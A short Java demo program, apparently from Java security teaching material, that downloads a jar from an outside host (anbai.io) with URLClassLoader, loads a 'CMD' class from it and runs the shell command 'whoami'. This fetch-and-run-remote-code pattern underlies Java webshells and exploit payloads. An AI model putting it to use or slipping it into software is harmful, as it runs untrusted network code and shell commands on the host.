import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;
import java.security.SecureClassLoader;

public class TestUrlClassLoader  extends ClassLoader {
    public static void main(String[] args) {
        try{
            URL url = new URL("http://anbai.io/tools/cmd.jar");
            URLClassLoader ucl = new URLClassLoader(new URL[]{url});
            String cmd ="whoami";
            Class cmdClass = ucl.loadClass("CMD");
            Process process = (Process)cmdClass.getMethod("exec",String.class).invoke(null,cmd);
            InputStream in = process.getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[]b = new byte[1024];
            int a = -1;
            while((a=in.read(b))!=-1){
                baos.write(b,0,a);
            }
            System.out.println(baos);

        }catch (Exception e)
        {
            e.printStackTrace();
        }
    }

}
